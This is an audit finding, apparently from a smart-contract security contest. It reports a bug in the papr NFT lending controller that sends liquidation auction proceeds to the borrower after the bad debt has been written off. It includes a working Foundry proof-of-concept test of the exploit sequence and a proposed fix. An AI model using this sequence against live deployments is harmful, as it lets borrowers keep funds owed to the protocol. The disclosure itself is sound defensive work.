[H-01] Borrowers may earn auction proceeds without filling the debt shortfall
Submitted byhihen, also found bybin2chen,rvierdiiev, andHollaDieWaldfee
The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.
Proof of Concept
Assume N is an allowed NFT, B is a borrower, the vault V is_vaultInfo[B][N]:
B add two NFTs (N-1 and N-2) as collaterals to vault V.BincreaseDebt()of vault V.The vault V becomes liquidatable.Someone callsstartLiquidationAuction()to liquidate collateral N-1.No one buys N-1 because the price of N is falling.AfterliquidationAuctionMinSpacing - 2days, someone callsstartLiquidationAuction()to liquidate collateral N-2.Someone callspurchaseLiquidationAuctionNFTto purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:
if(isLastCollateral&&remaining!=0) {/// there will be debt left with no NFTs, set it to 0_reduceDebtWithoutBurn(auction.nftOwner,auction.auctionAssetContract,remaining);}
Someone callspurchaseLiquidationAuctionNFTto purchase N-2. All the excess will be transferred to B becauseneededToSaveVaultis 0 anddebtCachedis 0:
if(excess>0) {remaining=_handleExcess(excess,neededToSaveVault,debtCached,auction);}
The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.Test code for PoC:
diff--gita/test/paprController/PoC.solb/test/paprController/PoC.solnewfilemode100644index0000000..0b12914--- /dev/null+++b/test/paprController/PoC.sol@@ -0,0+1,147@@+// SPDX-License-Identifier: GPL-2.0-or-later+pragmasolidity^0.8.17;++import"forge-std/console.sol";+import{ERC721}from"solmate/tokens/ERC721.sol";++import{ReservoirOracleUnderwriter}from"../../src/ReservoirOracleUnderwriter.sol";+import{INFTEDA}from"../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol";++import{BasePaprControllerTest}from"./BasePaprController.ft.sol";+import{IPaprController}from"../../src/interfaces/IPaprController.sol";++contractPoCisBasePaprControllerTest{+eventReduceDebt(addressindexedaccount,ERC721indexedcollateralAddress,uint256amount);+eventTransfer(addressindexedfrom,addressindexedto,uint256amount);++INFTEDA.Auctionauction1;+INFTEDA.Auctionauction2;+addresspurchaser=address(2);++functionsetUp()publicoverride{+super.setUp();++// mint a second collateral+nft.mint(borrower,collateralId+1);+// add collaterals, loan max and sells+_addCollaterals();+_loanMaxAndSell();+// borrower now has 2.9... USD+assertGt(underlying.balanceOf(borrower),2.9e6);++// prepare purchaser+vm.startPrank(purchaser);+safeTransferReceivedArgs.debt=controller.maxDebt(oraclePrice) -10;+safeTransferReceivedArgs.proceedsTo=purchaser;+safeTransferReceivedArgs.swapParams.minOut=0;+for(uinti=0;i<3;i++) {+nft.mint(purchaser,10+i);+nft.safeTransferFrom(purchaser,address(controller),10+i,abi.encode(safeTransferReceivedArgs));+        }+vm.stopPrank();+// purchaser now has 4.4... papr+assertGt(debtToken.balanceOf(purchaser),4.4e18);++// make max loan liquidatable+vm.warp(block.timestamp+1days);+priceKind=ReservoirOracleUnderwriter.PriceKind.TWAP;+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+    }++functiontestPoC()public{+vm.startPrank(purchaser);+debtToken.approve(address(controller),type(uint256).max);++// start auction1, collateralId+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+auction1=controller.startLiquidationAuction(borrower,collateral,oracleInfo);++// nobody purchage auction1 for some reason(like nft price falling)++// start auction2, collateralId+1+vm.warp(block.timestamp+controller.liquidationAuctionMinSpacing());+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+auction2=controller.startLiquidationAuction(+borrower,IPaprController.Collateral({id:collateralId+1,addr:nft}),oracleInfo);++IPaprController.VaultInfomemoryinfo=controller.vaultInfo(borrower,collateral.addr);+assertGt(info.debt,2.99e18);++// purchase auction1+uint256beforeBalance=debtToken.balanceOf(borrower);+uint256price=controller.auctionCurrentPrice(auction1);+uint256penalty=price*controller.liquidationPenaltyBips() /1e4;+uint256reduced=price-penalty;+uint256shortfall=info.debt-reduced;+// burn penalty+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),penalty);+// reduce debt (partial)+vm.expectEmit(true,false,false,true);+emitReduceDebt(borrower,collateral.addr,reduced);+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),reduced);+//!! burning the shortfall debt not covered by auction+vm.expectEmit(true,false,false,true);+emitReduceDebt(borrower,collateral.addr,shortfall);+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+controller.purchaseLiquidationAuctionNFT(auction1,price,purchaser,oracleInfo);++// reduced: 0.65..+assertLt(reduced,0.66e18);+// fortfall: 2.34..+assertGt(shortfall,2.34e18);+//!! debt is 0 now+info=controller.vaultInfo(borrower,collateral.addr);+assertEq(info.debt,0);++// purchase auction2+// https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29+vm.warp(block.timestamp+78831);+beforeBalance=debtToken.balanceOf(borrower);+price=controller.auctionCurrentPrice(auction2);+penalty=price*controller.liquidationPenaltyBips() /1e4;+uint256payouts=price-penalty;+// burn penalty+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),penalty);+//!! reduce 0 because debt is 0+vm.expectEmit(true,false,false,true);+emitReduceDebt(borrower,collateral.addr,0);+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),0);+//!! borrower get the payouts that should be used to reduce the shortfall debt+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),borrower,payouts);+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+controller.purchaseLiquidationAuctionNFT(auction2,price,purchaser,oracleInfo);++//!! borrower wins+uint256afterBalance=debtToken.balanceOf(borrower);+assertEq(afterBalance-beforeBalance,payouts);+assertGt(payouts,2.4e18);+    }++function_addCollaterals()internal{+vm.startPrank(borrower);+nft.setApprovalForAll(address(controller),true);+IPaprController.Collateral[]memoryc=newIPaprController.Collateral[](2);+c[0] =collateral;+c[1] =IPaprController.Collateral({id:collateralId+1,addr:nft});+controller.addCollateral(c);+vm.stopPrank();+    }++function_loanMaxAndSell()internal{+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+IPaprController.SwapParamsmemoryswapParams=IPaprController.SwapParams({+amount:controller.maxDebt(oraclePrice*2) -4,+minOut:1,+sqrtPriceLimitX96:_maxSqrtPriceLimit({sellingPAPR:true}),+swapFeeTo:address(0),+swapFeeBips:0+        });+vm.prank(borrower);+controller.increaseDebtAndSell(borrower,collateral.addr,swapParams,oracleInfo);+    }+}
Test output:
Running 1 test for test/paprController/PoC.sol:PoC[PASS] testPoC() (gas: 720941)Test result: ok. 1 passed; 0 failed; finished in 1.21s
Tools Used
VS Code
Recommended Mitigation Steps
The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.
Implementation code:
diff--gita/src/PaprController.solb/src/PaprController.solindex284b3f4..d7e4cea100644---a/src/PaprController.sol+++b/src/PaprController.sol@@ -61,6+61,8@@contractPaprControlleris/// @dev account => asset => vaultInfomapping(address=>mapping(ERC721=>IPaprController.VaultInfo))private_vaultInfo;+/// @dev account => asset => shortfall amount+mapping(address=>mapping(ERC721=>uint256))private_shortfall;/// @dev does not validate args/// e.g. does not check whether underlying or oracleSigner are address(0)@@ -288,6+290,8@@contractPaprControlleris}if(isLastCollateral&&remaining!=0) {+// increase shortfall+_shortfall[auction.nftOwner][auction.auctionAssetContract] +=remaining;/// there will be debt left with no NFTs, set it to 0_reduceDebtWithoutBurn(auction.nftOwner,auction.auctionAssetContract,remaining);}@@ -408,6+412,10@@contractPaprControllerisreturn_vaultInfo[account][asset];}+functionshortfall(addressaccount,ERC721asset)externalviewreturns(uint256) {+return_shortfall[account][asset];+    }+/// INTERNAL NON-VIEW ///function_addCollateralToVault(addressaccount, IPaprController.Collateralmemorycollateral)internal{@@ -543,7+551,20@@contractPaprControlleris// we owe them more papr than they have in debt// so we pay down debt and send them the rest_reduceDebt(auction.nftOwner,auction.auctionAssetContract,address(this),debtCached);-papr.transfer(auction.nftOwner,totalOwed-debtCached);++uint256payout=totalOwed-debtCached;+uint256burnShortfall=_shortfall[auction.nftOwner][auction.auctionAssetContract];+if(burnShortfall>=payout) {+burnShortfall=payout;+            }+if(burnShortfall>0) {+// burn the previous shortfall+PaprToken(address(papr)).burn(address(this),burnShortfall);+_shortfall[auction.nftOwner][auction.auctionAssetContract] -=burnShortfall;+            }+if(payout>burnShortfall) {+papr.transfer(auction.nftOwner,payout-burnShortfall);+            }}else{// reduce vault debt_reduceDebt(auction.nftOwner,auction.auctionAssetContract,address(this),totalOwed);
Jeiwan (warden) commented:
State mismanagement causes writing off of a bad debt while thereâ€™s still a collateral NFT being auctioned. As a result, the proceedings of the auction are not used to repay the bad debt and are sent directly to the debtor.
wilsoncusack (Backed) confirmed and commented:
Agree with @Jeiwan. TheisLastCollateralcheck should also check whether there is another auction ongoing:https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527